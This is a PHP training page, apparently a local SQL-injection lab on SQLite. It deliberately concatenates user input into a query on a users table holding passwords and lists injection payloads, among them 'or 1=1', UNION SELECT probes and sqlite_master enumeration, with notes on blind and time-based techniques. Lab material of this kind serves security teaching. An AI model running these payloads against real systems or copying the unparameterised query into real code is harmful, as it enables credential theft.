<!DOCTYPE html>
<html lang="fr">

<head>
    <title>Training: SQL</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <script defer src="js/fontawesome.all.js"></script>

    <link rel="stylesheet" href="site.css">
</head>



<body>

    <?php
    // Detecter une SQLi
    // - erreur
    // - delay

    // Type d'injection
    // ARG1
    // SELECT * from users WHERE id=ARG1
    // SELECT id, name, password from users WHERE id=ARG1
    // SELECT id, name, password from users WHERE name='ARG1'
    // SELECT id, name, password from users WHERE name='ARG1' and password='ARG2'

    // Obtenir un Result
    // - Aff liste des res: injecter nos resultats, au bon format 
    // - generer une erreur détaillée, exploiter le contenu de l'erreur
    // - resultat binaire:
    //      - ok/ko selon 1er result, déduire les insfos avec des tests logiques
    //      - generer un delai

    require_once('train_log.php');
    include 'train_sqli_db.php';

    trainClearLog();
    if (isset($_POST['cmd'])) {
        exec_cmd($_POST['cmd']);
    }

    $CMDINJ_SQL="SELECT id, login, password from users WHERE id=";
    if (isset($_POST['intinject'])) {
        exec_intinject($CMDINJ_SQL, $_POST['intinject']);
    }
    ?>


    <div class='panel'>
        <div class='panel-heading'>
            <div class='panel-title'>SQL Training</div>
        </div>   

        <div class='panel-body'>
        
<div class='cmd-title'>SQLite version</div>
<div>
select sqlite_version();
</div>   
<div class='cmd-title'>Database filename</div>
<div>
select file from pragma_database_list where name='main';
</div>  

<div class='cmd-title'>List tables</div>
<div>
SELECT name FROM sqlite_master WHERE type ='table' AND name NOT LIKE 'sqlite_%';
</div>
<div class='cmd-title'>Get Columns</div>
<div>
SELECT sql FROM sqlite_master WHERE name='users';
<br/>
PRAGMA table_info(users);

            </div>
        </div>
        <div class='panel-div'></div>

        <div class='panel-body'>
            <div class='panel-title'>Command</div>
            <form class='' action='' method="post">
                <input class='form-control sql-cmd-input' type='text' name='cmd' placeholder='' value='SELECT * from users' required='required' />
                </br>
                <input type="submit" value="Execute" />
            </form>
        </div>
        <div class='panel-div'></div>

        <div class='panel-body'>
            <div class='cmd-title'>Normal usage</div>
            <div>
1</div>
<div class='cmd-title'>Add all existing entries</div>
<div>
1 or 1=1</br>
<br/>
<div class='cmd-title'>Select one existing entry</div>
<div>
1 or 1=1 LIMIT 1 OFFSET 1</br>
<br/>
<div class='cmd-title'>Add entries</div>
<div>
1 UNION SELECT 11,22,33;
<br/>
<div class='cmd-title'>Select added entry</div>
<div>
1 UNION SELECT 11,22,33  LIMIT 1 OFFSET 1;
1 and 1=2 UNION SELECT 11,22,33;</br>
<br/>
<div class='cmd-title'>SQLite Version</div>
<div>
1 and 1=2 UNION SELECT sqlite_version(), 22, 33;
<br/>
<div class='cmd-title'>Tables</div>
<div>
1 and 1=2 UNION SELECT name,2,33 FROM sqlite_master WHERE type ='table'</br>
1 and 1=2 UNION SELECT GROUP_CONCAT(name, '-'),2,33 FROM sqlite_master WHERE type ='table'
<br/>


            </div>
        </div>
        <div class='panel-div'></div>

<div class='panel-body'>
    <div class='panel-title'>Command Injection: integer</div>
    <form class='' action='' method="post">
        <div class="form-group sql-cmd-input">
            <?php echo $CMDINJ_SQL; ?><input class='form-control sql-grow' type='text' name='intinject' placeholder='' value='1' required='required' />
        </dvi>
        </br>
        <input type="submit" value="Execute" />
    </form>
</div>

        <div class='panel-div'></div>
        <div class='panel-body'>
            <div class='panel-title'>Debug logs</div>
            <div>
                <?php echo trainGetLogs(); ?>
            </div>
        </div>
    </div>

</body>

</html>